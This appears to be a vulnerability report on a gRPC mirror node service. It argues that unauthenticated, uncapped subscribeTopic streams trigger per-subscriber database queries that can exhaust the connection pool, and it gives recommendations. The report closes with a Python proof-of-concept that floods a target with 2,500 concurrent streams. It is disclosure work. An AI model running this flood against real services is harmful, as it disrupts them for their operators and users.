### Title
Unauthenticated Unbounded Subscriber Creation Exhausts Database Connection Pool via Per-Subscriber safetyCheck Queries

### Summary
Any unauthenticated external client can open an arbitrary number of gRPC connections to `ConsensusController.subscribeTopic()`, each spawning an independent `TopicContext` with its own `safetyCheck` Mono and historical retrieval Flux that issue real database queries. Because no global subscriber cap, per-IP rate limit, or authentication gate exists, an attacker can trivially exhaust the PostgreSQL connection pool, starving legitimate subscribers and the importer of database connections.

### Finding Description

**Code path:**

`ConsensusController.subscribeTopic()` (lines 43–53) accepts every inbound gRPC call with no authentication or rate-limiting check:

```java
public void subscribeTopic(ConsensusTopicQuery request, StreamObserver<ConsensusTopicResponse> responseObserver) {
    final var disposable = Mono.fromCallable(() -> toFilter(request))
            .flatMapMany(topicMessageService::subscribeTopic)
            ...
            .subscribe(...);
``` [1](#0-0) 

Each call unconditionally enters `TopicMessageServiceImpl.subscribeTopic()` (line 61), which allocates a **new, independent** `TopicContext`:

```java
TopicContext topicContext = new TopicContext(filter);
``` [2](#0-1) 

Two database-hitting Fluxes are then constructed per subscriber:

1. **Historical retrieval** — fires immediately on subscription (line 63):
```java
Flux<TopicMessage> historical = topicMessageRetriever.retrieve(filter, true);
``` [3](#0-2) 

2. **safetyCheck** — fires a second DB query 1 second after subscription for every subscriber whose `isComplete()` returns `false` (lines 67–70):
```java
Flux<TopicMessage> safetyCheck = Mono.delay(Duration.ofSeconds(1L))
        .filter(_ -> !topicContext.isComplete())
        .flatMapMany(_ -> missingMessages(topicContext, null))
        .subscribeOn(Schedulers.boundedElastic());
``` [4](#0-3) 

For open-ended subscriptions (no `endTime`), `isComplete()` always returns `false`:
```java
if (filter.getEndTime() == null) {
    return false;
}
``` [5](#0-4) 

When `missingMessages()` is called with `current == null` (the safetyCheck path), it unconditionally calls `topicMessageRetriever.retrieve(gapFilter, false)` — a real DB query (lines 142–149): [6](#0-5) 

**Only existing throttle:** `NettyProperties.maxConcurrentCallsPerConnection = 5` limits calls *per connection*, but places no cap on the number of connections an attacker may open: [7](#0-6) 

There is no global subscriber cap, no per-IP connection limit, and no authentication requirement anywhere in the controller or service layer. [8](#0-7) 

### Impact Explanation
Each attacker-controlled subscriber consumes at minimum two database connections/queries (historical + safetyCheck). With N connections × 5 calls each, the attacker generates 10N simultaneous DB queries in the first second. Once the PostgreSQL connection pool is exhausted, all subsequent DB operations — including those from the Hedera importer writing new consensus messages — queue or fail, effectively severing the mirror node from its database backend. Legitimate subscribers receive errors or stall indefinitely. Severity: **High** (unauthenticated, full service disruption).

### Likelihood Explanation
The gRPC port is typically internet-exposed by design (it is the public API). No credentials, tokens, or prior state are required. A single attacker machine can open thousands of TCP connections and issue 5 `subscribeTopic` RPCs per connection using any standard gRPC client. The attack is trivially scriptable, repeatable, and requires no knowledge of valid topic IDs (an invalid topic ID with `checkTopicExists=false` still proceeds through the full subscription pipeline). [9](#0-8) 

### Recommendation
1. **Global subscriber cap**: Enforce a configurable maximum on `subscriberCount` (already tracked via `AtomicLong`) and reject new subscriptions with `RESOURCE_EXHAUSTED` when the cap is reached.
2. **Per-IP / per-connection rate limiting**: Add a gRPC interceptor that enforces a maximum number of active subscriptions per source IP.
3. **Authentication gate**: Require a bearer token or mTLS for `subscribeTopic` in production deployments.
4. **safetyCheck scope**: The safetyCheck should only fire if the live listener has actually stalled (e.g., no message received within the delay window), not unconditionally for every subscriber.
5. **Connection-level limits**: Configure Netty's `maxConnectionsPerIp` in addition to `maxConcurrentCallsPerConnection`.

### Proof of Concept
```python
import grpc
import threading
from com.hedera.mirror.api.proto import consensus_service_pb2_grpc, consensus_service_pb2
from com.hederahashgraph.api.proto.java import basic_types_pb2

TARGET = "mirror-node-grpc:5600"
CONNECTIONS = 500   # 500 TCP connections
CALLS_PER_CONN = 5  # maxConcurrentCallsPerConnection default

def flood(conn_id):
    channel = grpc.insecure_channel(TARGET)
    stub = consensus_service_pb2_grpc.ConsensusServiceStub(channel)
    query = consensus_service_pb2.ConsensusTopicQuery(
        topicID=basic_types_pb2.TopicID(topicNum=1)
        # no endTime → isComplete() always False → safetyCheck always fires
    )
    streams = [stub.subscribeTopic(query) for _ in range(CALLS_PER_CONN)]
    # Hold streams open to keep DB connections consumed
    for s in streams:
        try:
            next(iter(s))
        except Exception:
            pass

threads = [threading.Thread(target=flood, args=(i,)) for i in range(CONNECTIONS)]
for t in threads: t.start()
for t in threads: t.join()
# Result: 2500 concurrent DB queries fired within ~1s; connection pool exhausted;
# legitimate mirror node operations begin failing with DB timeout errors.
```

### Citations

**File:** grpc/src/main/java/org/hiero/mirror/grpc/controller/ConsensusController.java (L43-53)
```java
    public void subscribeTopic(ConsensusTopicQuery request, StreamObserver<ConsensusTopicResponse> responseObserver) {
        final var disposable = Mono.fromCallable(() -> toFilter(request))
                .flatMapMany(topicMessageService::subscribeTopic)
                .map(this::toResponse)
                .onErrorMap(ProtoUtil::toStatusRuntimeException)
                .subscribe(responseObserver::onNext, responseObserver::onError, responseObserver::onCompleted);

        if (responseObserver instanceof ServerCallStreamObserver serverCallStreamObserver) {
            serverCallStreamObserver.setOnCancelHandler(disposable::dispose);
        }
    }
```

**File:** grpc/src/main/java/org/hiero/mirror/grpc/service/TopicMessageServiceImpl.java (L61-61)
```java
        TopicContext topicContext = new TopicContext(filter);
```

**File:** grpc/src/main/java/org/hiero/mirror/grpc/service/TopicMessageServiceImpl.java (L63-63)
```java
        Flux<TopicMessage> historical = topicMessageRetriever.retrieve(filter, true);
```

**File:** grpc/src/main/java/org/hiero/mirror/grpc/service/TopicMessageServiceImpl.java (L67-70)
```java
        Flux<TopicMessage> safetyCheck = Mono.delay(Duration.ofSeconds(1L))
                .filter(_ -> !topicContext.isComplete())
                .flatMapMany(_ -> missingMessages(topicContext, null))
                .subscribeOn(Schedulers.boundedElastic());
```

**File:** grpc/src/main/java/org/hiero/mirror/grpc/service/TopicMessageServiceImpl.java (L94-106)
```java
    private Mono<?> topicExists(TopicMessageFilter filter) {
        var topicId = filter.getTopicId();
        return Mono.justOrEmpty(entityRepository.findById(topicId.getId()))
                .switchIfEmpty(
                        grpcProperties.isCheckTopicExists()
                                ? Mono.error(new EntityNotFoundException(topicId))
                                : Mono.just(Entity.builder()
                                        .memo("")
                                        .type(EntityType.TOPIC)
                                        .build()))
                .filter(e -> e.getType() == EntityType.TOPIC)
                .switchIfEmpty(Mono.error(new IllegalArgumentException("Not a valid topic")));
    }
```

**File:** grpc/src/main/java/org/hiero/mirror/grpc/service/TopicMessageServiceImpl.java (L142-149)
```java
        if (current == null) {
            long startTime = last != null
                    ? last.getConsensusTimestamp() + 1
                    : topicContext.getFilter().getStartTime();
            var gapFilter =
                    topicContext.getFilter().toBuilder().startTime(startTime).build();
            log.info("Safety check triggering gap recovery query with filter {}", gapFilter);
            return topicMessageRetriever.retrieve(gapFilter, false);
```

**File:** grpc/src/main/java/org/hiero/mirror/grpc/service/TopicMessageServiceImpl.java (L204-206)
```java
            if (filter.getEndTime() == null) {
                return false;
            }
```

**File:** grpc/src/main/java/org/hiero/mirror/grpc/config/NettyProperties.java (L14-14)
```java
    private int maxConcurrentCallsPerConnection = 5;
```

**File:** grpc/src/main/java/org/hiero/mirror/grpc/GrpcProperties.java (L17-30)
```java
public class GrpcProperties {

    private boolean checkTopicExists = true;

    @NotNull
    private Duration endTimeInterval = Duration.ofSeconds(30);

    @Min(1)
    private int entityCacheSize = 50_000;

    @NotNull
    @Valid
    private NettyProperties netty = new NettyProperties();
}
```
